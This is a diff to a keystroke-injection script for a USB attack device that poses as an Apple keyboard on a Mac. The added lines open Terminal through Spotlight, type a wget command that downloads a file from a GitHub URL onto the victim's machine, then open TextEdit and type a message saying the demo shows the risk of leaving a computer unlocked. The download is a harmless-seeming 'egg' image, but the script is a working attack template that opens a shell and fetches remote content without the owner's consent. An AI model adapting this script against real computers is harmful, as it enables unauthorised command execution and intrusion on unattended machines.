@@ -2,20 +2,28 @@ REM Pulls up TextEdit app on Mac and displays a message
 
 ATTACKMODE HID VID_05ac PID_0267
 
-DELAY 1000
+DELAY 850
+RIGHTARROW
+DELAY 300
+ENTER
+DELAY 300
 GUI SPACE
 DELAY 750
-STRING textedit.app
-DELAY 450
+STRING terminal
+DELAY 500
 ENTER
-DELAY 1000
+DELAY 500
+STRING wget https://github.com/highdeftant/flipper_files/rubber_ducky/work/egg.jpg
+ENTER
+DELAY 400
+STRING textedit.app
+DELAY 500
+ENTER
+DELAY 850
 ENTER
 STRINGLN > Script Initiated !
 STRINGLN > This is to demonstrate the vulnerabity in leaving your pc unlocked when away
 STRINGLN > This could have gone much worse!
 STRINGLN > - spoofy
+ENTER
 STRINGLN > Version 1.3: this now uploads an egg to one of your main folders, cya!
-
-
-
-
